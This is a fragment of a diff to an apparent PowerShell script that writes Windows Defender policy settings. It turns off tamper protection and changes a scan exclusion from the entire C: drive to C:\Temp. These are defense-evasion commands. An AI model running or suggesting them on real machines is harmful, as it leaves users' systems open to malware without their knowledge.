@@ -13,4 +13,4 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-
 New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "TamperProtection" -Value 0 -Force
 
 # Excluding certain paths from Windows Defender scans
-Add-MpPreference -ExclusionPath "C:\"
+Add-MpPreference -ExclusionPath "C:\Temp"
